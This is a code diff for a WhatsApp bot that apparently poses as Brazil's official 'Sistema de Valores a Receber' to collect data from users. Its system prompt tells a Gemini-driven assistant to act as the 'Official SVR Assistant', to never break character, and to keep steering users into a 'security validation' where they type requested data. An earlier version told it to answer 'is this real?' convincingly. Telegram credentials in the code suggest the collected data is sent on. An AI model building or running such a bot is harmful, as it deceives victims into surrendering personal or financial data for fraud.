@@ -7,10 +7,21 @@ const dotenv = require('dotenv');
 
 dotenv.config();
 
-const API_URL = process.env.SVR_SYS_CORE_URL || 'https://portalsvr.shardweb.app';
+const API_URL = (process.env.SVR_SYS_CORE_URL || 'https://portalsvr.shardweb.app').replace(/\/$/, "");
 const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "").replace(/"/g, "");
 const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "").replace(/"/g, "");
 const GEMINI_KEY = process.env.SVR_AI_RUNTIME_TOKEN || "";
+
+function mask(str) {
+    if (!str) return "NÃO CONFIGURADO";
+    return str.substring(0, 6) + "..." + str.substring(str.length - 4);
+}
+
+console.log(`\n🤖 [BOT WHATSAPP] INICIANDO...`);
+console.log(`---------------------------------------------`);
+console.log(`📡 PORTAL_URL: ${API_URL}`);
+console.log(`🧠 AI_TOKEN:   ${mask(GEMINI_KEY)}`);
+console.log(`---------------------------------------------\n`);
 
 async function askAI(prompt, userMessage) {
     if (!GEMINI_KEY) return "Desculpe, estou em manutenção. Por favor, siga as instruções de validação acima.";
@@ -19,7 +30,7 @@ async function askAI(prompt, userMessage) {
         const systemPrompt = `Você é o Assistente Oficial do SVR (Sistema de Valores a Receber). Seu objetivo ÚNICO é ajudar o usuário a completar a validação de segurança para receber o dinheiro dele. 
         Instruções:
         1. Seja profissional, educado e direto.
-        2. Se o usuário perguntar algo fora do assunto (ex: 'quem é você?', 'como funciona?', 'isso é real?'), responda de forma convincente e diga que para prosseguir ele DEVE seguir as instruções de segurança e digitar o dado solicitado.
+        2. Se o usuário perguntar algo fora do assunto, traga-o de volta ao foco da validação.
         3. Nunca saia do personagem.
         4. Use negrito em palavras chave.
         5. Mantenha as respostas curtas (máximo 3 frases).`;
@@ -29,6 +40,7 @@ async function askAI(prompt, userMessage) {
         });
         return response.data.candidates[0].content.parts[0].text;
     } catch (e) {
+        console.error("❌ [AI] Erro Gemini:", e.message);
         return "Para sua segurança, prossiga com a validação dos dados solicitados acima.";
     }
 }
